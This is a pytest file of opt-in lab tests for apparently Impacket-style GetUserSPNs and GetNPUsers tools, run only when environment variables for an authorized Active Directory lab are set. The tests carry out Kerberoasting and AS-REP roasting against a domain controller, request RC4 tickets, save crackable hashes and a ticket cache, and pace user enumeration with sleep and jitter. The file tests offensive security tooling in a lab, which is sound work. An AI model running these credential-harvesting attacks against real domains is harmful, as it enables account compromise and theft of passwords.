"""Opt-in tests for the explicitly authorized Active Directory laboratory."""

import os
import time

import pytest

import GetNPUsers
import GetUserSPNs


REQUIRED = (
    "ORPHEUS_LAB_DC",
    "ORPHEUS_LAB_DOMAIN",
    "ORPHEUS_LAB_USERNAME",
    "ORPHEUS_LAB_PASSWORD",
)
pytestmark = [
    pytest.mark.lab,
    pytest.mark.skipif(
        any(not os.environ.get(name) for name in REQUIRED),
        reason="authorized Orpheus lab variables are not configured",
    ),
]


def test_lab_kerberoasting_rc4(tmp_path, capsys):
    output = tmp_path / "kerb-rc4.txt"
    target = "%s/%s:%s" % (
        os.environ["ORPHEUS_LAB_DOMAIN"],
        os.environ["ORPHEUS_LAB_USERNAME"],
        os.environ["ORPHEUS_LAB_PASSWORD"],
    )
    code = GetUserSPNs.main([
        target, "-dc-ip", os.environ["ORPHEUS_LAB_DC"], "-request",
        "-outputfile", str(output), "-encryption", "23", "-overwrite",
    ])
    capsys.readouterr()
    assert code in (0, 1)
    assert output.stat().st_size > 0


def test_lab_asrep_requested_etype(tmp_path, capsys):
    username = os.environ.get("ORPHEUS_LAB_ASREP_USER", os.environ["ORPHEUS_LAB_USERNAME"])
    output = tmp_path / "asrep-aes.txt"
    code = GetNPUsers.main([
        f'{os.environ["ORPHEUS_LAB_DOMAIN"]}/{username}', "-no-pass", "-request",
        "-dc-ip", os.environ["ORPHEUS_LAB_DC"], "-outputfile", str(output),
        "-encryption", "18", "-overwrite",
    ])
    capsys.readouterr()
    assert code == 0
    assert output.stat().st_size > 0


def test_lab_kerberoasting_saves_hash_and_ccache(tmp_path, capsys, monkeypatch):
    spn_user = os.environ.get("ORPHEUS_LAB_SPN_USER")
    if not spn_user:
        pytest.skip("ORPHEUS_LAB_SPN_USER is not configured")
    output = tmp_path / "kerb-save.txt"
    target = "%s/%s:%s" % (
        os.environ["ORPHEUS_LAB_DOMAIN"],
        os.environ["ORPHEUS_LAB_USERNAME"],
        os.environ["ORPHEUS_LAB_PASSWORD"],
    )
    monkeypatch.chdir(tmp_path)

    code = GetUserSPNs.main([
        target, "-dc-ip", os.environ["ORPHEUS_LAB_DC"],
        "-request-user", spn_user, "-save", "-outputfile", str(output),
        "-encryption", "23", "-overwrite",
    ])

    capsys.readouterr()
    assert code == 0
    assert output.stat().st_size > 0
    assert (tmp_path / f"{spn_user}.ccache").stat().st_size > 0


def test_lab_asrep_paces_after_failed_attempt(tmp_path, capsys):
    asrep_user = os.environ.get("ORPHEUS_LAB_ASREP_USER")
    if not asrep_user:
        pytest.skip("ORPHEUS_LAB_ASREP_USER is not configured")
    users = tmp_path / "users.txt"
    users.write_text(f"orpheus.nonexistent.test\n{asrep_user}\n", encoding="utf-8")
    output = tmp_path / "asrep-paced.txt"

    started = time.monotonic()
    code = GetNPUsers.main([
        f'{os.environ["ORPHEUS_LAB_DOMAIN"]}/', "-no-pass", "-request",
        "-dc-ip", os.environ["ORPHEUS_LAB_DC"], "-usersfile", str(users),
        "-outputfile", str(output), "-sleep", "1", "-jitter", "0", "-overwrite",
    ])
    elapsed = time.monotonic() - started

    capsys.readouterr()
    assert code == 1
    assert elapsed >= 0.9
    assert output.stat().st_size > 0
